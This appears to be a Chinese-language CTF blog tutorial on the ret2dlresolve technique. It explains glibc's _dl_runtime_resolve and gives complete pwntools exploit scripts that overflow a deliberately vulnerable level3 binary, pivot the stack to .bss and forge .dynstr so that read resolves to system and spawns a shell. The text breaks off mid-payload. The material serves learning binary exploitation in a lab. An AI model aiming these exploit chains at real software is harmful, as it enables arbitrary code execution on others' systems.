l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"><span class="comment">//这一部分先通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中</span></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//这部分是使用elf_machine_fixup_plt对函数地址进行修正，将函数真实地址写入got表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们总结一下刚刚分析好的_dl_runtime_resolve过程</p><ol><li>首先获取后面需要使用的地址：<ul><li>通过宏D_PTR获取获得动态链接符号表的地址，动态链接字符串</li><li>获取.rel.plt的地址，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针</li><li>得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</li><li>基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</li></ul></li><li>接下来做一些检查：<ul><li>检查r_info中的重定位入口类型是否是R_386_JMP_SLOT</li><li>判断函数是否被解析过，是否属于属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</li></ul></li><li>紧接着获取version信息，通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中，最后对函数地址进行修正，将函数真实地址写入got表</li></ol><p>了解了_dl_runtime_resolve的基本过程，接下来我们来看看攻击的手法吧</p><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>从最直接的角度去想直接去修改.dynsym、.dynstr或者是修改.rel.plt，但是存在一些问题，我们会发现这些segment是不可写的，也就是说我们无法通过修改它们达到我们的目的。</p><ol><li><p>让我们换个思路，既然不能直接改写这些segment，是否可以间接控制到它们那？看看_dl_runtime_resolve过程的第一步，所有的地址索引都是从<strong>.dynamic</strong>开始的,也就是说，我们如果控制了.dynamic也就控制了整个动态链接的过程，也就可以实现执行目标代码。比如我们通过其劫持到strtab，我们既可以根据st_name的偏移伪造出字符串表，比如将write的偏移地方写上system，这样就可以到达我们执行目的函数的目标。但是这种方法的局限性较强，得No RELRO才行</p></li><li><p>再者我们先伪造出<strong>Elf32_Rel</strong>和<strong>Elf32_Sym</strong>两个结构体，并传入的虚假的reloc_offset参数，我们对reloc_offset做一个修改使得其位置发生偏移，通过虚假的reloc_arg使得程序流读取我们伪造的结构体，进而取得我们伪造的偏移量，最终取得伪造的函数字符串。这样也可以达到我们的目的，但是要注意这种方法存在一定的问题，其不能用于x64的架构在上面分析的代码里有这样一段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在64位条件下，我们程序的bss段是被映射到0x600000的，那么我们伪造的.dynsym也会在这个地址之后，而d_ptr是在0x400000，这样在取下标的时候很可能会很大从而取到二者之间的不可读区域</p></li><li><p>我们还是看看_dl_runtime_resolve的第一步，可以看到除了.dynamic之外，我们索引也通过D_PTR，也就是说如果我们<strong>伪造link_map</strong>，也就可以做到控制程序到目的函数。</p></li></ol><h2 id="攻击实战"><a href="#攻击实战" class="headerlink" title="攻击实战"></a>攻击实战</h2><h3 id="32位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#32位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="32位下通过修改.dynamic进行攻击（NO RELOR）"></a>32位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>我们先实验一下第一种攻击方式，由于没有现成的程序，所以我改写了一下XMan2016的level3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -fno-stack-protector -m32 -z norelro -no-pie level3.c -o level3_norelro_32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来checksec一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815210044087.png" alt="checksec"></p><p>确定是没有开RELRO的</p><p>先看一下偏移大小</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815211051440.png" alt="偏移"></p><p>我们先确定一下后面要使用到的一些地址</p><p>接下来我们要寻找到read存放跳转到_dl_runtime_resolve的地址，也就是got表一开始填写的地址，可以使用gdb来查看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210817110724393.png" alt="通过got.plt寻找代码"></p><p>这样我们就得到了<code>push 0x0 jmp _dl_runtime_resolve</code>的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049040</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br></pre></td></tr></table></figure><p>接下来还需要通过gdb来寻找dynstr地址在dynamic中保存的地址,由于我没有找到这个api,也不知道有没有,只能采用下面的方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr<span class="comment">#获取dynamic的地址</span></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr<span class="comment">#获取dynstr的地址</span></span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>调用gdb</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211031209.png" alt="查看地址"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211053995.png" alt="调用gdb"></p><p>我们可以看到该地址位于<em>0x804b208</em>,或者还有一个办法</p><p>使用<code>readelf -d level3_norelro_32</code>来查看.dynamic</p><p>数一数STRTAB的偏移</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211622145.png" alt="查看偏移"></p><p>那么其地址即为<code>dynamic_addr+str_offset*0x8+4</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr<span class="comment">#获取bss的地址</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span><span class="comment">#在bss上做一个偏移为我们的栈基址</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="comment">#获取.dynstr的内容</span></span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)<span class="comment">#替换read和system</span></span><br></pre></td></tr></table></figure><p>调用read为我们后面在栈里写入做一个准备,然后做一个栈迁移,将栈迁移到.bss段,而这里需要注意的是我们栈是向下生长的，我们需要给其留足空间，防止其进入不可写的页，这里卡了我好久，一开始留出了0x100的空间，结果到后面一直出问题，调试了一个下午，这里要<strong>感谢帮助我和我一起讨论的师傅们，还要特别感谢ha1vk师傅帮我点出这个问题</strong>，要不是他们我可能再用一个晚上都解决不了这个问题。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)<span class="comment">#这里是为了将下面三个参数弹出栈而调用下面的gadget</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)<span class="comment">#将栈迁移到.bss段上</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来就是改写.dynamic在里面写入我们伪造的.dynstr和“sh”，然后通过伪造的符号表让read调用system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)<span class="comment">#ebp</span></span><br><span class="line">payload+=p32(read_plt)<span class="comment">#调用read向.dynamic读入虚假的地址</span></span><br><span class="line">payload+=p32(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span><span class="comment">#这里的参数实际上是p32(fake_stack+fake_str_offset)，但是这里会调用失败然后;结束命令，参数变为sh</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>这样就执行了system(‘sh’)。</p><p>其实最后这里如果觉得不舒服,想一次性直接调用system(‘/bin/sh\x00’)，也可以依照上面第一次rop的方法调用:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">4</span>)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="built_in">len</span>(payload)+<span class="number">8</span>+<span class="built_in">len</span>(fake_dynstr)+fake_stack)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049044</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#64位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="64位下通过修改.dynamic进行攻击（NO RELOR）"></a>64位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>代码依旧是上面的代码，但是我们的编译命令要稍作更改<code>gcc -fno-stack-protector -z norelro -no-pie level3.c -o level3_norelro_32</code>这样就i可以完成编译了</p><p>64位下攻击更为便捷，基本上只需要一条rop链就可以完成我们的攻击，流程和之前几乎一样，甚至更为简单，这里就不过多进行赘述，直接上exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x0000000000401040</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">dynamic_dynstr_addr=<span class="number">0x403220</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_dynstr_len=<span class="built_in">len</span>(fake_dynstr)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#向.bss段写入虚假的strtab还有/bin/sh\x00</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(dynamic_dynstr_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#改写.dynamic的dynstr指针</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bss_addr+fake_dynstr_len)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=fake_dynstr+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(bss_addr)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）"><a href="#32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）" class="headerlink" title="32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）"></a>32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）</h3><p>还是上面的程序不过这里我们做一些修改，使其RELRO保护变为Partial RELRO。编译命令为</p><p><code>gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie  leve3.c -o level3_partialrelro_32</code>在这种情况下我们之前的攻击方式就会变得无效，因为.dynamic会变得不可写，所以我们不能再用同样的方法攻击。这里就要采用我们攻击思路的第二条了</p><p>我们先展示一下Elf32_Rel和Elf32_Sym的结构是怎么样的，以便后面伪造</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info; </span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>结构体中的成员我们在之前蒋的静态链接介绍过，二者都占有一个字长即为4个字节</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; </span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_word st_size; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line">    Elf32_Section st_shndx; </span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>符号表项的具体结构也在上次的静态链接中介绍过，这里重点在于st_name，其决定了其符号的字符串在字符串表的位置。</p><p>我们先列出后面需要用到的地址plt_0的地址可以在ida中找到，如果找不到可以</p><p>先查找<a href="mailto:&#x72;&#x65;&#x61;&#x64;&#x40;&#x67;&#x6f;&#x74;&#46;&#112;&#108;&#116;">&#x72;&#x65;&#x61;&#x64;&#x40;&#x67;&#x6f;&#x74;&#46;&#112;&#108;&#116;</a>里存放的代码地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202356235.png" alt="查看.got.plt表"></p><p>然后再查看这部分代码就可以得到plt0的位置啦</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202734272.png" alt="查看代码得到plt0"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>接下来还是一样做栈迁移到.bss段，并做后续的工作，防止爆栈</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来我们也借用CTF Wiki的渐进思路来一步步深入的学习这个部分</p><h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><p>我们先做简单的一步，手动调用plt[0]，来解析write函数，将我们的命令打印出来即可。我们需要提前将write_reloc_age给push进栈，也就是我们只要在栈里存放着write的write_reloc_age即可。这里寻找write的reloc_age也和之前找plt[0]的方法一样。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820151957887.png" alt="寻找write的reloc_age"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_reloc_age=<span class="number">0x10</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload 